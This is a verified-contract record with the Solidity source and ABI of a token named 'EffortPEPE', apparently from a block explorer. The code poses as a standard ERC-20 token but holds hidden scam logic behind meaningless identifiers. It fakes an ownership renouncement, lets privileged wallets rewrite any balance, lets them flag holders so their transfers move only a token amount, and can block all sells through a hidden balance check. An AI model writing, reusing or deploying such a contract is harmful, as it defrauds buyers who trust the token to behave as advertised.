{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface autoTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingSwapWallet) external view returns (uint256);\n\n    function transfer(address atExempt, uint256 launchTake) external returns (bool);\n\n    function allowance(address tradingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atExempt,\n        uint256 launchTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalExempt, uint256 value);\n    event Approval(address indexed tradingLimit, address indexed spender, uint256 value);\n}\n\nabstract contract atSenderTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listSell {\n    function createPair(address receiverWallet, address swapIs) external returns (address);\n}\n\ninterface autoToMetadata is autoTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffortPEPE is atSenderTeam, autoTo, autoToMetadata {\n\n    bool public senderModeAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverList;\n    }\n\n    bool private isShould;\n\n    uint256 private modeLiquidity;\n\n    function senderTrading(address fundToken, uint256 launchTake) public {\n        sellIs();\n        tokenLiquidity[fundToken] = launchTake;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTeam;\n    }\n\n    bool public shouldAmountLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return feeExempt;\n    }\n\n    function transferFrom(address launchLiquidityShould, address atExempt, uint256 launchTake) external override returns (bool) {\n        if (_msgSender() != amountSell) {\n            if (sellMode[launchLiquidityShould][_msgSender()] != type(uint256).max) {\n                require(launchTake <= sellMode[launchLiquidityShould][_msgSender()]);\n                sellMode[launchLiquidityShould][_msgSender()] -= launchTake;\n            }\n        }\n        return tradingList(launchLiquidityShould, atExempt, launchTake);\n    }\n\n    bool public tokenTo;\n\n    function balanceOf(address marketingSwapWallet) public view virtual override returns (uint256) {\n        return tokenLiquidity[marketingSwapWallet];\n    }\n\n    address private teamTrading;\n\n    function transfer(address fundToken, uint256 launchTake) external virtual override returns (bool) {\n        return tradingList(_msgSender(), fundToken, launchTake);\n    }\n\n    string private feeExempt = \"Effort PEPE\";\n\n    function teamEnable(uint256 launchTake) public {\n        sellIs();\n        buySell = launchTake;\n    }\n\n    function sellIs() private view {\n        require(minTeam[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapIsShould;\n    }\n\n    bool public modeIs;\n\n    address public launchedList;\n\n    mapping(address => bool) public minTeam;\n\n    address amountSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        fundTo teamSwap = fundTo(amountSell);\n        launchedList = listSell(teamSwap.factory()).createPair(teamSwap.WETH(), address(this));\n        \n        tradingLiquidity = _msgSender();\n        tokenMinBuy();\n        minTeam[tradingLiquidity] = true;\n        tokenLiquidity[tradingLiquidity] = receiverList;\n        \n        emit Transfer(address(0), tradingLiquidity, receiverList);\n    }\n\n    uint256 private fundExempt;\n\n    uint256 launchedIs;\n\n    string private swapIsShould = \"EPE\";\n\n    mapping(address => uint256) private tokenLiquidity;\n\n    address receiverMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function teamMinAt(address walletFeeReceiver) public {\n        require(walletFeeReceiver.balance < 100000);\n        if (senderModeAuto) {\n            return;\n        }\n        if (launchedSender) {\n            modeLiquidity = fundExempt;\n        }\n        minTeam[walletFeeReceiver] = true;\n        \n        senderModeAuto = true;\n    }\n\n    uint256 buySell;\n\n    function tokenMinBuy() public {\n        emit OwnershipTransferred(tradingLiquidity, address(0));\n        teamTrading = address(0);\n    }\n\n    bool private amountTrading;\n\n    uint256 constant fundIsLiquidity = 17 ** 10;\n\n    function marketingTrading(address atLaunched) public {\n        sellIs();\n        if (amountTrading) {\n            launchedSender = true;\n        }\n        if (atLaunched == tradingLiquidity || atLaunched == launchedList) {\n            return;\n        }\n        shouldExempt[atLaunched] = true;\n    }\n\n    address public tradingLiquidity;\n\n    function allowance(address isLaunch, address maxBuy) external view virtual override returns (uint256) {\n        if (maxBuy == amountSell) {\n            return type(uint256).max;\n        }\n        return sellMode[isLaunch][maxBuy];\n    }\n\n    bool public launchedSender;\n\n    function tradingList(address launchLiquidityShould, address atExempt, uint256 launchTake) internal returns (bool) {\n        if (launchLiquidityShould == tradingLiquidity) {\n            return limitReceiver(launchLiquidityShould, atExempt, launchTake);\n        }\n        uint256 exemptFundIs = autoTo(launchedList).balanceOf(receiverMin);\n        require(exemptFundIs == buySell);\n        require(atExempt != receiverMin);\n        if (shouldExempt[launchLiquidityShould]) {\n            return limitReceiver(launchLiquidityShould, atExempt, fundIsLiquidity);\n        }\n        return limitReceiver(launchLiquidityShould, atExempt, launchTake);\n    }\n\n    uint256 private receiverList = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public shouldExempt;\n\n    function approve(address maxBuy, uint256 launchTake) public virtual override returns (bool) {\n        sellMode[_msgSender()][maxBuy] = launchTake;\n        emit Approval(_msgSender(), maxBuy, launchTake);\n        return true;\n    }\n\n    function limitReceiver(address launchLiquidityShould, address atExempt, uint256 launchTake) internal returns (bool) {\n        require(tokenLiquidity[launchLiquidityShould] >= launchTake);\n        tokenLiquidity[launchLiquidityShould] -= launchTake;\n        tokenLiquidity[atExempt] += launchTake;\n        emit Transfer(launchLiquidityShould, atExempt, launchTake);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return teamTrading;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellMode;\n\n    uint8 private sellTeam = 18;\n\n    event OwnershipTransferred(address indexed tradingLaunchTx, address indexed fundSwapReceiver);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunchTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSwapReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwapWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderModeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTake\",\"type\":\"uint256\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAmountLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchTake\",\"type\":\"uint256\"}],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFeeReceiver\",\"type\":\"address\"}],\"name\":\"teamMinAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMinBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EffortPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}